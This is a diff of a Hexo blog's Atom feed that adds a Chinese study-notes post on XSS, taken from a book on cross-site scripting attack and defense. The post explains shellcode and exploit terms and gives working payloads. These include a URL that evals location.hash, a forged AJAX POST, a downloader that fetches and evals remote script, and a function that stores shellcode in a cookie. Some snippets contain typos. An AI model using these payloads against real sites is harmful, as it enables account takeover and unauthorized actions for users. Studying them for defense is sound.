@@ -4,7 +4,7 @@
   <subtitle><![CDATA[分享学习和生活中的点滴]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://www.m4ster.net/"/>
-  <updated>2014-12-29T10:19:08.109Z</updated>
+  <updated>2014-12-30T03:31:55.218Z</updated>
   <id>http://www.m4ster.net/</id>
   
   <author>
@@ -15,33 +15,66 @@
   <generator uri="http://zespia.tw/hexo/">Hexo</generator>
   
   <entry>
-    <title><![CDATA[Hello World]]></title>
-    <link href="http://www.m4ster.net/2014/12/29/hello-world/"/>
-    <id>http://www.m4ster.net/2014/12/29/hello-world/</id>
-    <published>2014-12-29T10:18:24.000Z</published>
-    <updated>2014-12-24T04:39:02.000Z</updated>
-    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">trobuleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick_Start">Quick Start</h2>
-<h3 id="Create_a_new_post">Create a new post</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
+    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（三）]]></title>
+    <link href="http://www.m4ster.net/2014/12/30/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
+    <id>http://www.m4ster.net/2014/12/30/《XSS跨站脚本攻击剖析与防御》学习笔记（三）/</id>
+    <published>2014-12-30T01:49:29.000Z</published>
+    <updated>2014-12-30T03:31:29.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="Shellcode">Shellcode</h2>
+<p>在跨站脚本当中，是指JS等脚本编写的XSS利用代码</p>
+<h2 id="Exploit">Exploit</h2>
+<p>Exploit的英文意思就是利用，再黑客眼里就是漏洞利用。通常表示完整编写好的漏洞利用工具（或程序），具有一定攻击性。Exploit中往往包含了Shellcode</p>
+<h2 id="POC">POC</h2>
+<p>即Proof of Concept的缩写，是一段证明漏洞存在的程序代码片段。</p>
+<blockquote>
+<p>在XSS中调用Shellcode的方式有很多种。</p>
+</blockquote>
+<h2 id="动态调用远程JavaScript">动态调用远程JavaScript</h2>
+<p>使用script标签，其src属性指向脚本地址，然后把引用JS的代码插入到网页的<code>&lt;head&gt;</code>标签后。</p>
+<h2 id="使用window-location-hash">使用window.location.hash</h2>
+<p>location是JavaScript管理地址栏的内置对象。比如location.href用来管理页面的URL，用location.href=url就可以直接将页面重定向URL，而location.hash则可以用来获取或设置页面的标签值。比如<code>http://domain/#admain的location.hash=&quot;#admin&quot;</code>，利用这个属性值可以做一件非常有意义的事情。如：  </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.bug.com/view.php?sort="&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert('XSS')</div></pre></td></tr></table></figure>
 
-<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run_server">Run server</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
+<p>substr()可在字符串中抽取从start下表开始的指定数目的字符，所以location.hash.substr(1)的作用是抽取“#”符号后面的字符，即alert(‘XSS’)。通过这个技巧可以把Shellcode写到地址参数中再执行。<br><strong>ajax提交post请求：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">"index.php?mod=blog&act=dopost"</span>;</div><div class="line"><span class="keyword">var</span> content = <span class="string">"blog_content = Test"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sd_Post</span><span class="params">(Url,Args)</span></span>{</div><div class="line">	<span class="keyword">var</span> xmlhttp;</div><div class="line">	<span class="keyword">var</span> error;</div><div class="line">	<span class="built_in">eval</span>(<span class="string">'try {xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");}catch(e){xmlhttp = null; error = e;}'</span>);}</div><div class="line">	<span class="keyword">if</span>(<span class="literal">null</span> != xmlhttp){</div><div class="line">		xmlhttp.Open(<span class="string">"Post"</span>,Url,<span class="literal">false</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"x-requested-with"</span>,<span class="string">"XMLHttpRequest"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Referer"</span>,<span class="string">"http://www.my.com/api_proxy.html"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Accept"</span>,<span class="string">"application/json,text/javascript,*/*"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencode"</span>);</div><div class="line">		xmlhttp.setRequestHeader(<span class="string">"Host"</span>,<span class="string">"www.my.com"</span>);</div><div class="line">		xmlhttp.Send(Args);</div><div class="line">		strText = xmlhttp.responseText;</div><div class="line">	}</div><div class="line">_sd_post(url,content)</div></pre></td></tr></table></figure>
 
-<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate_static_files">Generate static files</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
+<p><strong>利用window.location.hash写入地址栏：</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.bug.com/view.php?sort="&gt;<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#【Exploit】</div></pre></td></tr></table></figure>
 
-<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
+<p>这个Exp还可以经过各种编码处理以加强迷惑性。</p>
+<h2 id="XSS_Downloader">XSS Downloader</h2>
+<p>另一种存储和调用Shellcode的方法，即将其存储到网站的数据库中（<code>包括网页信息、文章内容、个人资料等地方</code>），然后再把它下载下来。<br>简单地说，就是一个JS获取网页内容的代码。事先把Shellcode写再网站的某个页面，再利用XMLHTTP控件向网站发送HTTP请求（POST或GET），然后执行返回的数据，一个简单的POC：  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">funciton XSS(){</div><div class="line">	a = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHTTP'</span>);</div><div class="line">	a.Open(<span class="string">'get'</span>,<span class="string">'http://www.bug.com/11211.html'</span>,flase;);</div><div class="line">	a.send();</div><div class="line">	b=a.responseText;</div><div class="line">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.substring(b.indexOf(<span class="string">'BOF|'</span>) + <span class="number">4</span>,b.indexOf(<span class="string">'|EOF'</span>))));</div><div class="line">}</div><div class="line">XSS();</div></pre></td></tr></table></figure>
 
-<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+<p>而在<code>http://www.bug.com/11211.html</code>页面写入Shellcode代码：</p>
+<blockquote>
+<p><code>Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212</code></p>
+</blockquote>
+<h2 id="备选存储技术">备选存储技术</h2>
+<p>譬如HTTP cookie、Flash共享对象、UserData、locaStorage等。<br>在Cookie中存储Shellcode的POC如下：  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setShellCodz</span><span class="params">(codz)</span></span>{</div><div class="line">	<span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>();</div><div class="line">	exp.setTime(exp.getTime() + <span class="number">365</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>);</div><div class="line">	<span class="built_in">document</span>.cookie = <span class="string">'shellcode='</span> + <span class="built_in">escape</span>(codz)+<span class="string">';'</span> + exp.toGMTString();</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>HTML5也提供了两种在客户端存储数据的新方法，包括localStorage和sessionStroage，其用法基本相同。以localStroage为例，存储数据的方法是直接给window.localStorage添加一个属性，如：  </p>
+<blockquote>
+<p><code>window.localStorage.a</code></p>
+</blockquote>
+<p>或者</p>
+<blockquote>
+<p><code>window.localStorage[&quot;a&quot;]</code></p>
+</blockquote>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io]]>
+    <![CDATA[<h2 id="Shellcode">Shellcode</h2>
+<p>在跨站脚本当中，是指JS等脚本编写的XSS利用代码</p>
+<h2 id="Exploit">Exploit</h2>
+<p>Exploit的英文意思就是利用，再黑客眼里就是漏洞利用。通常表示完整编写好的漏]]>
     </summary>
+    
+      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
+    
+      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
+    
+      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
     
   </entry>
   
